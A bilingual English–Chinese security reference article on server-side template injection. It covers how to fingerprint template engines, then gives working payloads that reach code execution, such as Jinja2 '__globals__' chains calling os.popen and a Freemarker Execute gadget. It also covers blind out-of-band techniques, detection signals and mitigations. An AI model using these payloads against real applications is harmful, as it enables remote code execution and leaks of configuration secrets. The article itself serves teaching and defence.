---
id: ssti-server-side-template-injection
title_en: SSTI (Server-Side Template Injection)
title_zh: SSTI（服务端模板注入）
summary_en: A template engine evaluates expressions. If your input reaches one as template source rather than as data, the engine evaluates your expression — on the server, with the application's privileges. That is the difference from XSS, and why SSTI usually ends in code execution.
summary_zh: 模板引擎会求值表达式。如果你的输入不是作为数据、而是作为模板源码进入了引擎，那它求值的就是你的表达式 —— 在服务端，以应用的权限执行。这就是它和 XSS 的本质区别，也是 SSTI 往往直通代码执行的原因。
tags: [web, ssti, template-injection, rce, jinja2, twig, bugbounty]
tools: [tplmap, Burp Suite, interactsh]
attck: [T1190, T1059]
platform: [web]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### The bug in one sentence

Template engines take a template and a data context and produce output. The template is *code*: it contains expressions the engine evaluates. If user input is concatenated into the template itself rather than passed as context, the user is writing code.

```python
# safe: input is data
render_template_string("Hello {{ name }}", name=user_input)

# vulnerable: input is template source
render_template_string("Hello " + user_input)
```

The first version cannot be exploited by the content of `user_input`; the second evaluates whatever it contains. The same mistake appears in every language, usually in a "custom template" feature, an email body, a report title, or a filename used in a generated document.

### Step 1 — Find out which engine you are talking to

Send arithmetic. If it comes back evaluated, you are injecting:

| Payload | Evaluated by |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars (with helpers), Pebble |
| `${7*7}` | Freemarker, Thymeleaf, Mako, JSP EL, Velocity (with `#set`) |
| `#{7*7}` | Ruby (ERB/Slim), Pug |
| `<%= 7*7 %>` | ERB, EJS, ASP |
| `{7*7}` | Smarty (older syntax) |
| `@(7*7)` | Razor |
| `*{7*7}` | Thymeleaf (selection expression) |

Then narrow it down, because the exploitation differs completely between engines:

- `{{7*'7'}}` returns `7777777` on Jinja2 (Python string multiplication) and `49` on Twig (PHP casts). That single probe separates the two most common cases.
- `${7*7}` with a Java stack trace in the response points at Freemarker or Thymeleaf; Thymeleaf usually needs a Spring context and appears in Spring applications.
- A `{{ }}` that is not evaluated but a `${ }` that is suggests Angular-style client templating, which is a different bug (client-side, XSS class).

### Step 2 — From expression to execution

Every engine has a path from "I can evaluate an expression" to "I can run a command", because the template context contains objects that reach the runtime.

**Jinja2** is the most familiar:

```jinja
{{ config }}                                  {# dumps Flask config, often with secrets #}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }} {# find a useful class, then chain #}
```

The `__globals__` route is the reliable one: template globals include modules, modules include `os`. When a sandbox blocks `__globals__`, look for another object in the context (`cycler`, `lipsum`, `get_flashed_messages`, `request`) with the same property.

**Twig**: older versions allow registering a callback, newer ones rely on the same object-walking idea through `_self` or the filter system. A site running a framework that renders Twig with user-controlled template names is the usual way in.

**Freemarker**: the classic is the built-in `Execute` utility, reachable through the `?new()` built-in:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**Velocity**, **Smarty**, **Mako**, **ERB/EJS** and **Razor** each have their own equivalent: a way to reach reflection or a language builtin. The pattern is identical — walk from a template-visible object to a runtime capability — so the method is worth learning once and applying per engine.

Client-side frameworks are the confusing case. Vue, Angular and React render in the browser; injection there is XSS, not SSTI. The distinction is whether the evaluation happens on the server before the response is sent. A useful check: send a payload whose result would be visible in the raw response body but not in the DOM.

### Step 3 — When there is no output

Blind SSTI is common in email templates and PDF generation, where you never see the rendered result.

- **Time-based.** Cause a delay from inside the expression (sleep, a large loop, a slow filter) and measure the response time.
- **Out-of-band.** Make the server resolve a hostname you control, with the payload in the subdomain.
- **Side effects.** Write a file into a served directory, or trigger a request to an internal service you can observe.

The same injection is present; only the feedback channel changes.

### Where it actually lives

- "Custom template" or "custom theme" features in CMS and marketing platforms.
- Email and notification templates where a user controls the body or the subject.
- Invoice, report and PDF generation, especially when filenames or titles are user input.
- Error pages that render a message the user supplied.
- Any admin feature described as "advanced" or "developer".

The highest-yield search is not the search box: it is every place a user-supplied *string* is rendered into a document.

### Detection

- Template syntax in parameters: `{{`, `${`, `<%`, `#{`, and especially an arithmetic expression inside them.
- Errors mentioning the template engine (`jinja2.exceptions`, `Twig\Error`, `freemarker.core`) — a probe leaves a stack trace.
- Outbound DNS or HTTP from the application server with an encoded subdomain.
- Process creation where the parent is the web server (the RCE step).

### Mitigation

- **Never build a template from user input.** Concatenating input into template source is the whole vulnerability; pass it as context data instead.
- **Sandbox the engine** where a feature genuinely needs user templates: Jinja2's `SandboxedEnvironment`, Twig's sandbox extension, or a deliberately limited DSL of your own.
- **Do not expose rich objects** to the template context. Every object you add is a potential step toward the runtime.
- **Treat template names as a security boundary** and allow-list them; a user-supplied template path is often equivalent to a user-supplied template.
- **Run with least privilege**, so a successful escape lands somewhere uninteresting.
- **Log and alert on template syntax in inputs** and on engine error messages, which are both cheap and high-signal.

<!-- lang:zh -->
### 一句话说清这个漏洞

模板引擎接收一个模板和一份数据上下文，产出输出。而模板是**代码**：里面是引擎要计算的表达式。如果用户输入是被拼接进模板本身，而不是作为上下文数据传入，那用户写的就是代码。

```python
# 安全：输入是数据
render_template_string("Hello {{ name }}", name=user_input)

# 有漏洞：输入是模板源码
render_template_string("Hello " + user_input)
```

第一种写法靠 `user_input` 的内容无法利用；第二种会计算它包含的一切。同样的错误在每种语言里都会出现，通常藏在"自定义模板"功能、邮件正文、报表标题，或者被用于生成文档的文件名里。

### 第一步 —— 先确定面对的是哪个引擎

送一个算术表达式。如果它被计算后返回，你就注入了：

| Payload | 会被谁计算 |
|---|---|
| `{{7*7}}` | Jinja2、Twig、Nunjucks、Handlebars（带 helper）、Pebble |
| `${7*7}` | Freemarker、Thymeleaf、Mako、JSP EL、Velocity（配合 `#set`） |
| `#{7*7}` | Ruby（ERB/Slim）、Pug |
| `<%= 7*7 %>` | ERB、EJS、ASP |
| `{7*7}` | Smarty（旧语法） |
| `@(7*7)` | Razor |
| `*{7*7}` | Thymeleaf（选择表达式） |

然后进一步缩小范围，因为不同引擎的利用方式完全不同：

- `{{7*'7'}}` 在 Jinja2 上返回 `7777777`（Python 字符串重复），在 Twig 上返回 `49`（PHP 做类型转换）。这一个探针就能分开最常见的两种情况。
- `${7*7}` 且响应里出现 Java 堆栈，指向 Freemarker 或 Thymeleaf；Thymeleaf 通常需要 Spring 上下文，出现在 Spring 应用里。
- `{{ }}` 没被计算但 `${ }` 被计算，说明是 Angular 那类客户端模板 —— 那是另一种漏洞（客户端，XSS 类）。

### 第二步 —— 从表达式到执行

每个引擎都存在一条从"我能计算表达式"到"我能执行命令"的路，因为模板上下文里装着能触达运行时的对象。

**Jinja2** 最典型：

```jinja
{{ config }}                                  {# 打出 Flask 配置，常含密钥 #}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }} {# 找到有用的类再接力 #}
```

`__globals__` 这条路最可靠：模板全局里含着模块，模块里含着 `os`。当沙箱挡住 `__globals__` 时，去上下文里找另一个具备同样属性的对象（`cycler`、`lipsum`、`get_flashed_messages`、`request`）。

**Twig**：老版本可以注册回调，新版本要靠 `_self` 或过滤器体系走同样的对象遍历思路。常见入口是那个用可控模板名渲染 Twig 的框架功能。

**Freemarker**：经典手法是用内置的 `Execute` 工具类，通过 `?new()` 拿到：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**Velocity**、**Smarty**、**Mako**、**ERB/EJS**、**Razor** 各有各的等价物：要么触达反射，要么触达语言内建能力。模式是一样的 —— 从一个模板可见的对象走到运行时能力 —— 所以方法学一次、按引擎套用即可。

客户端框架是最容易混淆的情况。Vue、Angular、React 在浏览器里渲染；在那里的注入是 XSS，不是 SSTI。区分点是**求值是否发生在服务端、在响应发出之前**。一个有用的判据：送一个 payload，它的计算结果会出现在原始响应体里，但不会出现在 DOM 里。

### 第三步 —— 没有回显的时候

盲 SSTI 在邮件模板和 PDF 生成里很常见，你根本看不到渲染结果。

- **时间盲。** 在表达式里制造延迟（sleep、大循环、慢过滤器），然后测响应时间。
- **带外。** 让服务器去解析你控制的域名，把 payload 放在子域里。
- **副作用。** 往会被提供的目录里写文件，或者触发一个你能观察到的内部服务请求。

注入是同一个，变的只是反馈通道。

### 它实际藏在哪

- CMS 与营销平台里的"自定义模板""自定义主题"功能。
- 用户能控制正文或主题的邮件与通知模板。
- 发票、报表、PDF 生成，尤其是文件名或标题来自用户输入的时候。
- 渲染用户提供消息的错误页。
- 任何被描述成"高级"或"开发者"的管理功能。

收获最高的地方不是搜索框，而是**每一个把用户提供的字符串渲染进文档的位置**。

### 检测

- 参数里出现模板语法：`{{`、`${`、`<%`、`#{`，尤其是其中套着算术表达式。
- 报错里出现模板引擎名（`jinja2.exceptions`、`Twig\Error`、`freemarker.core`）—— 一次探测就会留下堆栈。
- 应用服务器向编码过的子域发出的 DNS 或 HTTP 请求。
- 父进程是 Web 服务器的进程创建（也就是 RCE 那一步）。

### 缓解

- **永远不要用用户输入构造模板。** 把输入拼进模板源码就是全部漏洞；把它当上下文数据传进去。
- 功能上确实需要用户自定义模板时，**启用引擎沙箱**：Jinja2 的 `SandboxedEnvironment`、Twig 的 sandbox 扩展，或者自己写一个刻意受限的 DSL。
- **不要把丰富的对象暴露进模板上下文。** 你每加一个对象，都是通往运行时的一级台阶。
- **把模板名当作安全边界**并做白名单；用户可控的模板路径往往等价于用户可控的模板。
- **最小权限运行**，让逃逸成功之后落在一个没什么价值的地方。
- **对输入里的模板语法和引擎报错记录并告警**，这两条成本低、命中率高。
